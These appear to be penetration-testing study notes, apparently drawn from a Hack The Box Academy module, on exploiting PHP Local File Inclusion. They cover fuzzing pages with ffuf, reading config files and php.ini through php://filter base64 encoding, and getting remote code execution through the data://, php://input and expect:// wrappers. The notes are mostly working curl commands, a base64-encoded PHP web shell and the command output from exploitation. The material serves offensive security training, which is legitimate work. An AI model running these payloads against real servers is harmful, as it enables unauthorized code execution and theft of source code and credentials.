## wrappers can be used to:
- read source code files
- RCE if either data,input,expect wrapper is allowed.
- read ssh keys if permissions are not set properly
## Practical LFI Source Code Reading Strategy

1. **Fuzz for all pages**: Not just `200 OK`, but also `301`, `302`, `403`.
2. **Start with `index.php`**: Read it using the base64 filter.
3. **Extract internal references**: Look for `include()`, `require()`, etc.
4. **Recursively read included files** using `php://filter` technique.
5. **Build a full picture** of how the application works.
The first step would be to fuzz for different available PHP pages with a tool like `ffuf` or `gobuster`, as covered in the [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54) module:
## fuzzing web app pages
```shell
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

...SNIP...

index                   [Status: 200, Size: 2652, 
config                  [Status: 302, Size: 0, 
```

## Source Code Disclosure using wrapper filter
```
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```
## php Wrapper filters
 Why Use These?

When including a `.php` file through LFI:
 **By default**: It gets executed by the PHP engine. Problem is that Config files like `config.php` don’t output anything to the browser, making it look like nothing was included.
If you include it  an LFI context:
`http://target.com/index.php?page=config.php`
You won't see source code. The file executes silently (especially config/setup files). May return blank, as these files don’t output HTML. The `php://filter` wrapper allows us to apply **filters** to a file stream. This is especially useful in **LFI (Local File Inclusion)** attacks to **read raw PHP source code** instead of executing it.
### Syntax

```
php://filter/read=<filter-name>/resource=<target-file>
```
---------------

### data wrapper RCE
```shell
# check for data wrapper
<VULN-PARAM>=php://filter/read=convert.base64-encode/resource=../../../../etc/php/<7.4 or fuzz for correct or try blind version>/apache2/php.ini"

$ echo '<b64 output' | base64 -d | grep allow_url_include

<ON/OFF RESULT>

# ## BLIND data wrapper ATTEMPTS

curl -s 'http://URL/index.php?<VULNPARAM>=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### Input Wrapper
```shell

## BLIND RCE ATTEMPTS

# example where vulnerable parameter accepts GET
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
           
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 
 # example where parameter accepts only POST
 curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input" | grep uid
```

### Expect wrapper
```shell
 echo '<base64 php.ini>' | base64 -d | grep expect

extension=expect

# exploit:
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# blind expect attempts:
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



----
NOTES
## Data & Input RCE
The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations.
**Checking PHP Configurations**
To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
**We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file.**
```shell-session
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
Once we have the base64 encoded string, we can decode it and `grep` for `allow_url_include` to see its value:
```shell-session
 echo '<b64 output' | base64 -d | grep allow_url_include

allow_url_include = On
```
writing webshell
```shell-session
echo '<?php system($_GET["cmd"]); ?>' | base64 -w 0

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```
Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:
```shell
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

# using curl
$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Input

Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

```shell
# example where vulnerable parameter accepts GET
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
           
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 
 # example where parameter accepts only POST
 curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input" | grep uid
```

**Note:** To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

---
## Expect

Finally, we may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases.

#### checking if expect is installed
We can determine whether it is installed on the back-end server just like we did with `allow_url_include` earlier, but we'd `grep` for `expect` instead, and if it is installed and enabled we'd get the following:
```shell-session
 echo '<base64 php.ini>' | base64 -d | grep expect

extension=expect
```


As we can see, the `extension` configuration keyword is used to enable the `expect` module, which means we should be able to use it for gaining RCE through the LFI vulnerability. To use the expect module, we can use the `expect://` wrapper and then pass the command we want to execute, as follows:
```shell-session
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

